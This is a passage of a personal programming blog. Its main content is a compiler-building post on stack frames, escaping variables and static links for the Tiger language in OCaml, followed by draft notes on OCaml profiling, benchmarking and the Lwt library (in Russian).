and local variables much earlier. We put args and locals right
near the FP at offsets that are known early (temporaries and
saved registers are known later).





Registers
We want to use CPU registers as much as possible to make
compiled programs run faster. Also we have a limited set of
registers available and many functions that use them. We must be
able to save and restore them (to/from a stack frame).
We say that a register is caller-save if the caller must save
and restore it, otherwhise it is callee-save. Which registers
are preserved depends on the machine architecture.





Parameters and returns addresses
In the early days (in 70&rsquo;s) on most machines function arguments
and return addresses were always passed on the stack. On modern
machines, for efficiency (to avoid high memory traffic), the
first several arguments, result and return address are passed in
registers. The rest args are passed in memory.
 


Why and how usage of registers helps
Suppose f(a, b, c) calls g(x, y, z).
The f receives its args in registers \( r_1, r_2 \) and \( r_3
\), but it must pass the args x, y and z in the same
registers \( r_1, r_2 \) and \( r_3 \). So the f should save
those registers to its stack frame before calling g and we&rsquo;re back
to the memory traffic problem.
So how the usage of registers saved any time?

Leaf procedures &ndash; those that don&rsquo;t call other procedures.
The most procedures called are leafs which need not write
their incoming args to memory. And often they don&rsquo;t need to
allocate a stack frame at all.
Interprocedural register allocation. A technique used by some
optimizing compilers to analyze all the functions in an
entire program at once and assign them different registers in
which to receive parameters and hold local variables.
Sometimes f doesn&rsquo;t need its args anymore by the time it
calls g, so it can just overwrite corresponding registers.
Register windows available on some architectures. Each
function can allocate a fresh set of registers without memory
traffic.



 


How incoming parameters are passed
The first k args \( a_1, \dots, a_k \) are passed in registers and
the rest \( a_{k&#43;1} ,\dots, a_n \) are placed at the end of the
callers own frame.
If the callee needed to write any of these arguments
(including those passed in registers) to memory, it would write
them to the very beginning of its own stack frame.
For simplicity we&rsquo;ll assume that by default everything is passed
and kept in registers, except for cases when:

variable is passed by reference
variable is accessed by a nested function
variable is too big to fit into a single register
array variables
register holding the variable is needed for some other purpose
there are many local variables and temporary values that they
won&rsquo;t all fit in registers








Escaping variables
Variable escapes if:

It is passed by reference
It is accessed from a nested function
Its address is taken (not applicable for Tiger)

But when the compiler sees a formal parameter or local variable
for the first time it doesn&rsquo;t yet know whether it escapes and
how many registers the calculation will require.
So we must assign some provisional locations (see the
alloc_local function) to all formals and locals, and decide
later which of them should really go in registers.





Static link (SL)

Block structure &ndash; a feature that allow the inner functions
use variables declared in outer functions
Static link (SL) &ndash; a pointer to the function statically
enclosing the current one

Static links are stored in stack frames.
Example of program with nested functions in Tiger.
type tree = {
  key: string,
  left: tree,
  right: tree
}

function prettyprint(tree: tree) : string =
  let
    var output := &#34;&#34;

    function write(s: string) =
      output := concat(output, s)

    function show(n: int, t: tree) =       &lt;--- [2]
      let
        function indent(s: string) = (
          for i := 1 to n do               &lt;--- [5]
             write(&#34; &#34;);
             output := concat(output, s);
             write(&#34;\n&#34;)
        )
      in
        if t = nil
        then ident(&#34;.&#34;)                    &lt;--- [3]
        else (
          indent(t.key);
          show(n &#43; 1, t.left);             &lt;--- [4]
          show(n &#43; 1, t.right)
        )
      end
  in
    show(0, tree);                         &lt;--- [1]
    output
  end

prettyprint calls show, passing prettyprint&rsquo;s own frame
pointer (FP) as show&rsquo;s static link (SL)
show stores its static link (SL) into its own stack frame
show calls indent, passing its own frame pointer (FP) as
indent&rsquo;s SL
show calls show, passing its own static link as SL
indent uses the value n from show&rsquo;s frame, it can find
n by using the SL (which points at the stack frame of
show)

Each call requires a one or more fetches using static links to resolve
variables declared in outer functions.



  Interface
  
    
    Link to heading
  




Stack frame and calling conventions
Every machine architecture might have a different standard stack
frame layout.
Suppose we have a call of the following function g(x1, x2, x3)
where the 1-st parameter escapes. Here is an example of how the
Frame.mk g [true; false; false] works on three different
architecture.
 
 



Architecture
Formals




Pentium
[InFrame 8; InFrame 12; InFrame 16]


MIPS
[InFrame 0; InReg t157; InReg t158]


SPARC
[InFrame 8; InReg t157; InReg t158]



 
 



Pentium
MIPS
SPARC




\( SF_{SP&#43;0} \leftarrow FP \)
\( SP \leftarrow SP-k \)
SAVE \(\ SP \), \( -k \), \(\ SP \)


\( FP \leftarrow SP \)
\( SF_{SP&#43;k&#43;0} \leftarrow r_2 \)
\( SF_{FP&#43;68} \leftarrow i_0 \)


\( SP \leftarrow SP-k \)
\( t_{157} \leftarrow r_4 \)
\( t_{157} \leftarrow i_1 \)



\( t_{157} \leftarrow r_5 \)
\( t_{158 }\leftarrow i_2 \)



 

\(SF\) &ndash; Stack frame memory region
\(k\)  &ndash; Number of formal parameters
\(t\)  &ndash; Temporary location
\(r_i\) &ndash; MIPS registers
\(i_i\) &ndash; SPARC registers

Thats why we&rsquo;ll use an abstract interface for stack frames.
Most of PC&rsquo;s and laptops are based on the x86 and x64 ISA.
Mobile devices usually based on the ARM ISA.

x86 &ndash; family of (32-bit) ISA based on the Intel 8086 and 8088 microprocessors
x64 &ndash; a 64-bit version of the x86 ISA supporting larger
amounts of virtual and physical memory &#43; additional
general-purpose registers

x86

Has 8 general-purpose registers: eax, ebx, ecx, edx, ebp, esp, esi, edi
32-bit (4-byte) words

x64

Has 16 general-purpose registers: rax, rbx, rcx, rdx, rbp, rsp, rsi, rdi, r8 - r15
64-bit (8-byte) words

Lets use the x64 ISA, there are 2 flavours of it:

Microsoft x64
System V AMD64 (which I prefer)

According to the System V AMD64 ABI, the first 6 integer
arguments are passed in left-to-right order in rdi, rsi, rdx,
rcx, r8 and r9 registers, respectively.
Arguments 5 and higher are passed in memory. They are pushed
onto the stack in reversed (right-to-left) order.
Helpful links:

System
V AMD64 ABI (page 12)
Calling
conventions (Wikipedia)
Calling
conventions (OS Dev)

Here is our interface for a stack frame:
(** Holds information about formal parameters and
    local variables allocated in this frame *)
type t [@@deriving show]

(** Abstract location of a formal parameter (function argument) or
    a local variable that may be placed in a frame or in a register *)
type access [@@deriving show]

(** Makes a new frame for a function with the
    given label and formal parameters *)
val mk : Temp.label -&gt; bool list -&gt; t

(** Extracts a list of accesses denoting
    the locations where the formal parameters will be
    kept at runtime, as seen from inside the callee *)
val formals : t -&gt; access list

(** Allocates a new local variable in the given frame or in a register.
    The boolean argument specifies whether the new variable
    escapes and needs to go in the frame.
    Returns &#34;in-memory&#34; access with an offset from the frame pointer or
    &#34;in-register&#34; access in case if it can be allocated in a register *)
val alloc_local : t -&gt; bool -&gt; access
To make a new frame for some function f we&rsquo;ll call Frame.mk label formals, where:

label: Temp.label &ndash; static memory address of the f
function (that is yet to be determined)
formals: bool list &ndash; true for each parameter
that escapes and false for each that doesn&rsquo;t

The stack frame should contain information about formal
parameters and local variables allocated:
type t = {
  (* label at which the function&#39;s machine code begins *)
  label: Temp.label;
  (* locations of all the formals *)
  formals: access list;
  (* number of locals allocated so far *)
  locals: int ref;
  (* instructions required to implement the &#34;view shift&#34; *)
  instrs: Instruction.t list;
} [@@deriving show]
We don&rsquo;t want to implement the view shift right now, so the
Instruction.t is defined like this:
type t = unit [@@deriving show]





ABI
Lets add some constants for System V ADM64 ABI to the Frame
module. We&rsquo;ll need them later.
(* word size in bytes *)
let word_size = 64 / 8 (* = 8 bytes *)

(* special registers *)
let fp = &#34;rbp&#34; (* frame pointer *)
let sp = &#34;rsp&#34; (* stack pointer *)

(* x64 &#34;parameter&#34;-registers *)
let rdi = &#34;rdi&#34;
let rsi = &#34;rsi&#34;
let rdx = &#34;rdx&#34;
let rcx = &#34;rcx&#34;
let	r8  = &#34;r8&#34;
let r9  = &#34;r9&#34;
let arg_regs = [rdi; rsi; rdx; r8; r9]

(* other x64 registers *)
let rbx = &#34;rbx&#34;
let r10 = &#34;r10&#34;
let r11 = &#34;r11&#34;
let r12 = &#34;r12&#34;
let r13 = &#34;r13&#34;
let r14 = &#34;r14&#34;
let r15 = &#34;r15&#34;

(* registers that are preserved by the caller *)
let caller_regs = [r10; r11]

(* registers that are preserved by the callee *)
let callee_regs = [rbx; r12; r13; r14; r15]





Access
The access data type describes location of a formal parameter
or a local variable that may be placed in a frame or in a
register:
type access =
   (* memory location at the specific offset from the frame pointer *)
  | InFrame of int
  (* register location *)
  | InReg of Temp.t
  [@@deriving show]
The rest of the Frame module implementation:
(* creates a new location for a formal parameter or
   a local variable, given its index and [esc] flag *)
let mk_access i = function
  | true -&gt; InFrame ((i &#43; 1) * (-word_size)) (* escapes - alloc in frame *)
  | false -&gt; InReg (Temp.mk ()) (* doesn&#39;t escape - use temp (register) *)

(* makes a new stack frame *)
let mk label formals =
  let formals = List.mapi mk_access formals in
  let locals = ref 0 in
  (* don&#39;t know yet what instructions we need,
     so just leave it empty for now *)
  let instrs = [] in
  { label; formals; locals; instrs }

let formals { formals; _ } = formals

(* local variables that do not escape can be allocated in a register,
   escaping variables must be allocated in the frame *)
let alloc_local { locals; _ } = function
  | true -&gt;
    incr locals;
    let offset = (!locals &#43; 1) * (-word_size) in
    InFrame offset
  | false -&gt;
    InReg (Temp.mk ())
alloc_local allocates a new local variable in the given frame
or in a register. The boolean argument specifies whether the new
variable escapes and needs to go in the frame. Returns in-memory
access with an offset from the frame pointer.
alloc_local t true
: → InFrame -4
alloc_local t true
: → InFrame -8
alloc_local t false
: → InReg t1
alloc_local t false
: → InReg t2
A clever compiler might optimize the frame size by noticing when
two frame-resident variables could be allocated to the same
slot.





Temporaries and labels
We need a couple of more abstractions to represent a
&ldquo;not known yet&rdquo; register and machine-language locations:

Temporary &ndash; an abstract name for a value that is
temporarily held in some register
Label (just like label in assembly language) &ndash; an abstract
name for a static machine-language location whose exact
address is yet to be determined

The Temp module manages these two distinct sets of names:
(** Abstract name for a local variable that
    is temporarily held in a register *)
type t [@@deriving show]

(** Abstract name for a static memory address that
    is yet to be determined *)
type label [@@deriving show]

(** Returns a new temporary from an infinite set of temporaries *)
val mk : unit -&gt; t

(** Returns a new [label], whose assembly-language name is
    the given string (if given), otherwise it is generated. *)
val mk_label : string option -&gt; label
The implementation of the Temp module:
module S = Symbol

type t = int [@@deriving show]
type label = Symbol.t [@@deriving show]

let mk =
  let idx = ref (-1) in
  fun () -&gt;
    incr idx;
    !idx

let mk_label name =
  let idx = ref (-1) in
  match name with
  | Some s -&gt;
    S.symbol s
  | None -&gt;
    incr idx;
    let name = string_of_int !idx in
    S.symbol name





View shift
Function arguments are seen differently by the caller and the
callee. In the book this is referred to as the view shift. For
example, a caller my put a parameter into register \(r_6\), but
the callee may want to access it from register \(r_9\). We want
to handle this view shift in the Frame module.
For each formal parameter we should calculate:

How it will be seen by callee (in a register, or in a frame
location)
What instructions are required to implement this view shift

To keep things simple, we are not going to implement this right
now.





Static links
The Frame module should not know anything about static links,
because we want it be independent of any specific source
language being compiled. We&rsquo;ll use Translate module to manage
static links.
The static link (which is a pointer to the enclosing function)
is passed to a function in a register and stored into the frame,
just like any other escaping formal parameter. So we will treat
it as one by adding another true value at the front the list
of booleans representing formal parameters. It means that for
some function f(x,y) (assuming neigher x nor y escapes)
we&rsquo;ll have the following list:
[true; false; false]
Notice the extra true at the beginning.





Translate module
The Translate module handles the notion of nested scopes (via
static links), providing the interface to the Semant module.
We separate Semant from Translate module to avoid a huge,
unweildy module that does both: type checking and semantic
translation.
Ok, I think at this point we are ready to write some initial
implementation:
type expr = unit

(** Represents a nesting level *)
type level

(** Describes a way to access a formal parameter or a local variable.
    Basically, it is just a [Frame.access] plus a nesting [level] *)
type access = level * Frame.access

(** Outermost level at which all
    top-level functions and variables are declared *)
val outermost : level

(** Creates a new &#34;nesting level&#34; for a function *)
val mk : level option -&gt; Temp.label -&gt; bool list -&gt; level

(** Extracts a list of accesses *)
val formals : level -&gt; access list

(** Creates an [access] at the given [level].
    The argument [bool] specifies whether the variable escapes *)
val alloc_local : level -&gt; bool -&gt; access
We don&rsquo;t know yet what the expr will be, thats why it is a
type alias for unit. And here is the basic implementation:
type expr = unit [@@deriving show]

type level = {
  parent: level option;
  frame: Frame.t
} [@@deriving show]

type access = level * Frame.access

let outermost =
  let label = Temp.mk_label None in
  { parent = None;
    frame = Frame.mk label [];
  }

let mk parent label formals =
  let formals = true :: formals in
  let frame = Frame.mk label formals in
  { parent; frame }

(* Returns formals (excluding the static link) *)
let formals lev =
  (* exclude the SL *)
  let args = List.tl (Frame.formals lev.frame) in
  List.map (fun access -&gt; lev, access) args

let alloc_local lev esc =
  let access = Frame.alloc_local lev.frame esc in
  lev, access
Notice the formals = true :: formals in the mk function, it
is there to represent a static link.





Env
We must keep the Translate.level along with the Temp.label
in the FunEntry. Also we need to update the VarEntry to
include the Translate.access.
Here is how our updated Env module looks like:
module T = Type
module Table = Symbol.Table

type access

(** Variable entry *)
type var_entry = {
  access: Translate.access; (** Describes how to access the variable **)
  ty: T.t (** Type of the variable *)
}

(** Function entry *)
type fun_entry = {
  level: Translate.level; (** Nesting level *)
  label: Temp.label; (** Label of the machine-code entry point *)
  formals: T.t list; (** Types of the formal parameters *)
  result: T.t (** Type of the result returned by the function **)
}

(** Term-level entry *)
type entry =
  | VarEntry of var_entry
  | FunEntry of fun_entry

(** Contains bindings for predefined functions *)
val base_venv : entry Table.t

(** Predefined types *)
val base_tenv : T.t Table.t





Escapes
To calculate which variables should be stored in registers and
which should be allocated in the frame we&rsquo;ll have a special
module named Escape.
Here its interface in OCaml:
(** Depth (nesting level) of the function that
    contains the variable declaration *)
type depth

(** Environment that maps variables to pairs of depth and
    a reference to a boolean flag indicating if a
    particular variable escapes *)
type env = (depth * bool ref) Symbol.Table.t

(** Looks for escaping variables and records this
    info in the [escape] fields of the abstract syntax *)
val traverse_prog : Syntax.expr -&gt; unit
The traverse_prog function is going to traverse the entire AST
looking for escaping uses of every variable. Also, we&rsquo;ll have a
separate environment env to track &ldquo;escaping&rdquo; of variables.
Whenever a variable or formal-parameter declaration \(a\) is
found at static function-nesting depth \(d\) then a new binding
(d, ref false) is entered into the environment env. This new
environment is used in processing expressions within the scope
of the variable. Then whenever this var or formal-parameter
\(a\) is used at depth \(\gt d\) (which means that it escapes),
then our &ldquo;escape ref&rdquo; is set to true in the environment.
This should take place before semantic analysis, because the
Semant module needs to know about escaping variables to do
it&rsquo;s work.





Semant
Now lets go and update our Semant module.
I won&rsquo;t paste the whole implementation, the code is here.



  Haskell @haskellhaskell
  
    
    Link to heading
  


  TODO A week of Liquid Haskell @liquid-haskellliquid-haskellrefinement-types
  
    
    Link to heading
  

In this post I&rsquo;ll share my experience of playing around with Liquid
Haskell for about a week.

  TODO Building a toy Ethereum-like VM in Haskell compilersethereumvm
  
    
    Link to heading
  


  TODO Writing a simple trading bot in Haskell trading
  
    
    Link to heading
  

Some time ago I was interested in trading blah blah.

  TODO Notes on parallel &amp; concurrent programming in Haskell
  
    
    Link to heading
  

\begin{equation}
\label{eq:1}
C = W\log_{2} (1&#43;\mathrm{SNR})
\end{equation}
See: http://www.jmilne.org/not/Mamscd.pdf
\(\require{AMScd}\)
\begin{CD}
K(X) @&gt;{ch}&raquo; H(X;\mathbb Q);\\
@VVV @VVV \\
K(Y) @&gt;{ch}&raquo; H(Y;\mathbb Q);
\end{CD}

  OCaml @ocamlocaml
  
    
    Link to heading
  


  DRAFT Instrumenting and profiling OCaml programs benchmarkingprofilingperformance
  
    
    Link to heading
  


  Intro
  
    
    Link to heading
  

Profiling is rather a large topic, but basically it allows us to
learn where the program spent its time and which functions
called which other functions during its execution. We use that
information to understand which pieces of our program are slower
than we expected.
Note the difference between profiling and benchmarking: we use
(micro-)benchmarking to estimate the cost of executing an
individual isolated pieces of code, but we use profiling to
understand to properties of the whole program and possibly find
the hot spots.
Usually profiling is achieved by instrumenting either the
program source code or its binary executable. Instrumentation
means adding some extra code to collect the required information
(for example, where it was called from), which may cause
significant performance changes. This is why code should only
execute if some special flag is set (like --profile / -p).
Here are some known instrumentation types according to the
Wikipedia:

Manual – performed by the programmer by adding extra code to
measure execution costs
Automatic source level – instrumentation added to the source
code by an automatic tool according to an instrumentation policy
Interpreter instrumentation – interpreter debug option can
enable the collection of performance metrics as the
interpreter encounters each target statement
Intermediate language – instrumentation added to assembly or
byte code
Binary translation – the tool adds instrumentation to a
compiled executable
Compiler assisted
Runtime instrumentation and injection

In this post we are going to take a closer look only at the
manual instrumentation and the interpreter instrumentation
in a context of the OCaml language and its ecosystem.
Typically profiling includes the following steps:

Compiling (or just running) a program with profiling enabled
Executing it to generate profile data
Analyzing profile data to find bottlenecks

We also may want to consider the output format. Generally these
forms may be available for the analysis:

Flat – Shows the average call times for each function and
how much time spent executing that function. Output is in the
form of a table, rows are usually sorted by decreasing time
spent and a number of calls, then alphabetically by name. Here
is the more detailed description with an example
Call-graph – Includes call-chains involved. Helps to find
functions that call other functions that spend unusual amounts
of time. Again, there is a good example in gprof docs
Annotated source – Lists the program  source code annotated
with the number of times each line of the program was executed
(see an example in gprof docs)
Input-sensitive – Additionally shows how an application’s
performance scales as a function of its input


  Tools
  
    
    Link to heading
  

There are several profiling tools available in OCaml ecosystem.



core_profiler
Library made by Jane Street that helps you profile programs and
estimate various costs. It belongs to the Core ecosystem,
which is good, but looks like it&rsquo;s poorly documented. Here is
the post describing this library and the docs (with usage
examples).





landmarks
The tool made by LexiFi. Personally I haven’t tried it, but it
looks good.



  References
  
    
    Link to heading
  

Statistical memory profiling:

http://ocaml.org/meetings/ocaml/2016/Jourdan-statistically_profiling_memory_in_OCaml.pdf
https://www.youtube.com/watch?v=wX4m8yqbuqE


  Summary
  
    
    Link to heading
  

Unfortunately this post is not finished :P

  DRAFT Benchmarking OCaml code benchmarkingperformance
  
    
    Link to heading
  

The most known tool for benchmarking OCaml code is the
Core_bench by Jane Street. There is a post about it in the Jane
Street tech blog that should help to get started, but it may be
a bit outdated.
Here is the basic usage:
open Core
open Core_bench

module B = Bench.Test

let benchmarks =
  let x = Random.float 10.0 in
  let y = Random.float 10.0 in
  [ B.create ~name: &#34;Float add&#34; (fun () -&gt; ignore (x &#43;. y))
  ; B.create ~name: &#34;Float mul&#34; (fun () -&gt; ignore (x *. y))
  ; B.create ~name: &#34;Float div&#34; (fun () -&gt; ignore (x /. y))
  ]

let () =
  let cmd = Bench.make_command benchmarks in
  Command.run cmd

  DONE Заметка о Lwt lwt
  
    
    Link to heading
  


  Что такое Lwt
  
    
    Link to heading
  

Lwt это одна из наиболее популярных OCaml библиотек,
разрабатываемая сообществом. По сути это просто реализация
кооперативной многозадачности (как альтернативы вытесняющей
многозадачности) в OCaml на основе Promises.
В дальнейшем я буду использовать слова “поток” и промис как
взаимозаменямые.

  Виды “многозадачностей”
  
    
    Link to heading
  

Этот параграф можно пропустить
Если в двух словах, то вытесняющую и кооперативную
многозадачность можно объяснить следующим образом:


Вытесняющая многозадачность означает, что у нас есть некий
планировщик, принимающий решения о том, когда будет
выполняться какой поток, обычно принимая во внимание приоритет
потоков и выделяя им некие кванты времени. Этот вид
многозадачности используется в большинстве современных ОС.


Кооперативная многозадачность – планировщик не принимает
решение о переключении потоков. Поток должен явно
сигнализировать о том, что он готов прерваться и предоставить
процессорное время другим потокам.



  Асинхронное программирование с Lwt и промисы
  
    
    Link to heading
  

Lwt предоставляет нам тип данных &#39;a Lwt.t. Можно относиться к
нему, как к “потоку”. Это обычный промис, содержащий некоторое
значение типа &#39;a, которое может быть вычислено, например,
когда-то в будущем, но только один раз. В терминах OCaml это
просто &#39;a ref, который будет заполнен позже. Изначально
значения в нём нет и промис находится в состоянии Sleep (pending).
Когда вычисление завершено успешно, Lwt помещает результат типа
&#39;a в наш промис и его состояние становится Return (resolved). В
случае же неудачи его состояние изменяется на Fail (rejected) и в
него помещается произошедшая ошибка.



API
Вот как выглядит тип, описывающий состояния:
type &#39;a state =
  | Return of &#39;a
  | Fail of exn
  | Sleep
Lwt предоставляет несколько полезных ф-ций:
val return : &#39;a -&gt; &#39;a Ltw.t
Понятно, что эта ф-ция тривиально упаковывает уже известно
значение в промис. Соответственно, этот промис сразу находится в
состоянии Return (resolved).
Значения, упакованные в Lwt.t, не могут быть просто извлечены
(т.к. вычисление может быть ещё не завершено). Для этого мы
должны использовать оператор bind:
val (&gt;&gt;=): &#39;a Lwt.t -&gt; (&#39;a -&gt; &#39;b Lwt.t) -&gt; &#39;b Lwt.t
Такая конструкция позволяет нам делать композицию промисов в
“монадическом” стиле.
f &gt;&gt;= g создаст нам промис, который ждёт пока завершится
“поток” f : &#39;a Lwt.t, получает результат его вычислений (некий
x : &#39;a) и передаёт его в ф-цию g : &#39;a -&gt; &#39;b Ltw.t, которая
запускает поток &#39;b Ltw.t. Если f находится в состоянии
pending, то и f &gt;&gt;= g будет в состоянии pending.
Соответственно, если f завершится с ошибкой, то и f &gt;&gt;= g
завершится с той же самой ошибкой.
Несколько других полезных ф-ций:
val join : unit Lwt.t list -&gt; unit Lwt.t
join получает список потоков и ожидает пока они все
завершатся. Если хотя бы один из них завершится с ошибкой
(перейдёт в состояние rejected), то и результирующий поток
завершится с той же ошибкой (после того, как все остальные
потоки завершат свои вычисления).
val choose : &#39;a t list -&gt; &#39;a t
choose ждёт пока выполнится хотя бы один поток. Если таких
оказалось несколько, то в качестве результата выбирается один из
них cлучайным образом.
На самом деле их огромное множество и все их можно найти тут.





PPX
У нас есть следующий синтаксический сахар:
let%lwt i = f () in
...
Что эквивалентно следующему фрагменту:
Lwt.bind (f ()) (fun i -&gt; ...)





Примеры
Следующие примеры я взял из официального туториала
Чтение из STDIN без Lwt, выполнение блокируется пока не
поступит пользовательский ввод:
let () =
  let line : string = Pervasives.read_line () in
  print_endline &#34;Now unblocked!&#34;;
  ignore line
С промисами Lwt выполнение продолжается:
let () =
  let line_promise : string Lwt.t = Lwt_io.(read_line stdin) in
  print_endline &#34;Execution just continues...&#34;;
  ignore line_promise
В данном случае это не совсем то, что нам нужно, т.к. программа
сразу завершает работу так и не дождавшись пользовательского
ввода. Чтобы заблокироваться и подождать пока промис выполнится
мы можем использовать ф-цию Lwt_main.run:
let () =
  let line_promise : string Lwt.t = Lwt_io.(read_line stdin) in
  print_endline &#34;Execution just continues...&#34;;
  let line : string = Lwt_main.run line_promise in
  ignore line
Lwt_main.run используется только 1 раз, чтобы подожать пока
завершится промис самого верхнего уровня. Когда этот промис
выполнится, программа завершает работу.





Ещё примеры:
Опять же, я не заморачивался и взял примеры из официального
туториала, тк я слишком ленивый, чтобы придумывать их самому.
Пример функции, которая печатает “tic” каждую секунду, не
блокируя другие “потоки”:
let rec tic () =
  print_endline &#34;tic&#34;;
  let%lwt () = Lwt_unix.sleep 1.0 in
  tic ()
Пример запуска нескольких “потоков” и ожидание их результатов.
Допустим у нас есть пара ф-ций f и g:
val f : unit -&gt; unit Lwt.t
val g : unit -&gt; unit Lwt.t
Следующий код запустит их вычисления последовательно:
let%lwt () = f () in
let%lwt () = g () in
...
А вот так мы можем запустить обе ф-ции конкурентно и сразу же
подождать их завершения:
let p1 = f () in
let p2 = g () in
let%lwt () = p1 in
let%lwt () = p2 in
...
Пример ф-ции, которая выполняет все вычисления из списка
конкрурентно:
let rec map f l =
  match l with
  | [] -&gt; Lwt.return []
  | v :: r -&gt;
      let t = f v in
      let rt = map f r in
      let%lwt v&#39; = t in
      let%lwt l&#39; = rt in
      Lwt.return (v&#39; :: l&#39;)
Следующая ф-ция наоборот, ожидает пока выполнится каждое
предыдущее вычисление из списка, прежде чем запустить следующее:
let rec map_serial f l =
  match l with
  | [] -&gt; return []
  | v :: r -&gt;
      let%lwt v&#39; = f v in
      let%lwt l&#39; = map_serial f r in
      Lwt.return (v&#39; :: l&#39;)
Конечно, это только самые “вершки” Lwt.



  Полезные ссылки
  
    
    Link to heading
  


Promises  в книге Functional Programming in OCaml
Lwt Gitter
Туториал Lwt in 5 minutes
Lwt мануал
Туториал про то, как сделать простой сервер на сокетах, позволяющий
клиентам подключаться, увеличивать счётчик и читать его
значение.


  Emacs @emacsemacs
  
    
    Link to heading
  


  DRAFT My first Emacs package: ormolu.el ormolu
  
    
    Link to heading
  


  Intro
  
    
    Link to heading
  

I&rsquo;ve been using Emacs on a daily basis for about 2 years already,
Ormolu is an opinionated zero-configuration formatter for
Haskell source code built in Tweag.

  DRAFT Writing an Emacs major mode for the Tiger language
  
    
    Link to heading
  


  References
  
    
    Link to heading
  

There is a really good tutorial by Xah Lee: Emacs Lisp How to
Write Major Mode, which I highly recommend reading.

  Formal Methods
  
    
    Link to heading
  


  Theorem Provers
  
    
    Link to heading
  

:@theorem_provers:theorem_provers:

  Designing a Theorem Prover, Part 1 folderol
  
    
    Link to heading
  


Table of Contents

Making of Tiger:@compilers:compilers&#x1f42f;ocaml:

DONE Making of Tiger #1, Intro
DONE Making of Tiger #2, Lexical Analysis:lexing:ocamllex:
DONE Making of Tiger #3, Parsing:parsing:menhir:
DRAFT Making of Tiger #4, Abstract Syntax:ast:
TODO Making of Tiger #5, Semantic Analysis:type_checking:
DONE Making of Tiger #6, Stack frames:stack:memory:


Haskell:@haskell:haskell:

TODO A week of Liquid Haskell:@liquid_haskell:liquid_haskell:refinement_types:
TODO Building a toy Ethereum-like VM in Haskell:compilers:ethereum:vm:
TODO Writing a simple trading bot in Haskell:trading:
TODO Notes on parallel &amp; concurrent programming in Haskell


OCaml:@ocaml:ocaml:

DRAFT Instrumenting and profiling OCaml programs:benchmarking:profiling:performance:
DRAFT Benchmarking OCaml code:benchmarking:performance:
DONE Заметка о Lwt:lwt:


Emacs:@emacs:emacs:

DRAFT My first Emacs package: ormolu.el:ormolu:
DRAFT Writing an Emacs major mode for the Tiger language


Formal Methods

Theorem Provers


Coq:@coq:coq:

Notes on Coq and Ssreflect:ssreflect:
Proving TAPL in Coq:tapl:
DONE Заметки про типы в Coq (WIP)


Rust:@rust:rust:

DONE Зелёные потоки в 200 строчек на Rust. Часть 1:@arm64:


Assembly:@assembly:assembly:

DONE Программирование для ARM64. Часть 1:@arm64:


Blockchain:@blockchain:blockchain:

Who to follow
Hahacks
EVM:@evm:@solidity:evm:solidity:
Ethereum Security Audit
My path to blockchain security audit:security:
CTF walkthrough:@ctf:ctf:security:





This is a summary.">
<meta name="keywords" content="Vasiliy Yorkin">
<meta name="fediverse:creator" content="" />


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="vyorkin.org">
  <meta name="twitter:description" content=" Making of Tiger @compilerscompilerstigerocaml Link to heading DONE Making of Tiger #1, Intro Link to heading Recently I’ve started reading the book by Andrew W. Appel titled Modern compiler implementation in ML. I’ve picked it up because I’ve heard some really good reviews about the ML version of it. Also there are other editions available that use C and Java. Each chapter covers a single phase of the compilation process and comes with some initial ML code and programming excercies. At the end you will have a working optimizing compiler.
I’m building a compiler for the first time and it is a lot of fun. In these blog post series, I’ll be working through the book and explaining my solutions to each chapter.
Getting started Link to heading The author describes Tiger as a simple (but nontrivial) language of the Algol family, which could be easily modified to be functional or object-oriented (maybe I’ll skip the OO-part of the book).
Here is an example program in Tiger type tree = { key: string, left: tree, right: tree } function prettyprint(tree: tree) : string = let var output := &#34;&#34; function write(s: string) = output := concat(output, s) function show(n: int, t: tree) = let function indent(s: string) = ( for i := 1 to n do write(&#34; &#34;); output := concat(output, s); write(&#34;\n&#34;) ) in if t = nil then ident(&#34;.&#34;) else ( indent(t.key); show(n &#43; 1, t.left); show(n &#43; 1, t.right) ) end in show(0, tree); output end For my implementation I’ve decided to use OCaml. It is close enough to SML so with even basic ML experience it should be fairly straightforward to port the code examples.
Straight-line programs
The first “warm-up” assignment is to implement a program analyzer and interpreter for the straight-line programming language. We have the following types:
type id = string type binop = Plus | Minus | Times | Div type stm = Compound of stm * stm | Assign of id * exp | Print of exp list and exp = Id of id | Num of int | Op of exp * binop * exp | Eseq of stm * exp So for the following sample straight-line program
a := 5 &#43; 3; b := (print(a, a - 1), a * 10); print(b) The corresponding AST would be
Compound( Assign(&#34;a&#34;, Op(Num 5, Plus, Num 3)), Compound( Assign(&#34;b&#34;, Eseq( Print [Id &#34;a&#34;; Op(Id &#34;a&#34;, Minus, Num 1)], Op(Num 10, Times, Id &#34;a&#34;))), Print [Id &#34;b&#34;])) The first task is to write a function
val maxargs : stm -&gt; int This function tells the maximum number of args of any print statement within any subexpression of a given statement.
Sounds easy, right? The implementation is pretty straightforward too:
open Base open Straightline let rec maxargs stm = let maxargs_exp = function | Eseq (stm, _) -&gt; maxargs stm | _ -&gt; 0 in match stm with | Print exps -&gt; let len = List.length exps in let exp_lens = List.map ~f:maxargs_exp exps in let max_exp_len = List.max_elt ~compare:Int.compare exp_lens in Int.max len (Option.value ~default:0 max_exp_len) | Compound (exp1, exp2) -&gt; let l1 = maxargs exp1 in let l2 = maxargs exp2 in Int.max l1 l2 | Assign (_, exp) -&gt; maxargs_exp exp Next, we need to write another function that “interprets” program in this language.
val eval : stm -&gt; unit A simple interpreter could look like this:
open Base open Stdio open Straightline let eval x op y = match op with | Plus -&gt; x &#43; y | Minus -&gt; x - y | Times -&gt; x * y | Div -&gt; x / y let rec interp_stm stm env = let print env0 exp = let (v, env1) = interp_exp exp env0 in print_endline (Int.to_string v); env1 in match stm with | Print exps -&gt; List.fold_left ~init:env ~f:print exps | Assign (key, exp) -&gt; let (data, env1) = interp_exp exp env in Map.set env1 ~key ~data | Compound (stm1, stm2) -&gt; let env1 = interp_stm stm1 env in interp_stm stm2 env1 and interp_exp exp env = match exp with | Id k -&gt; let v = Map.find_exn env k in (v, env) | Num x -&gt; (x, env) | Op (exp1, op, exp2) -&gt; let (x, env1) = interp_exp exp1 env in let (y, env2) = interp_exp exp2 env1 in let r = eval x op y in (r, env2) | Eseq (stm, exp) -&gt; let env1 = interp_stm stm env in interp_exp exp env1 Here we’re just recursively traversing a tree, keeping a map of identifiers, evaluating arithmetic operations and printing values.
Excersises Link to heading A couple of more excercises about trees, nothing super exciting. So I won’t paste the rest of my solutions here. To implement a balanced-tree (ex. d) I’ve read the chapter about Red-Black Trees in Okasaki book. The code is here.
Well, thats all for part 1! The next one is about lexical analysis where we’ll write a simple lexer for the Tiger language.
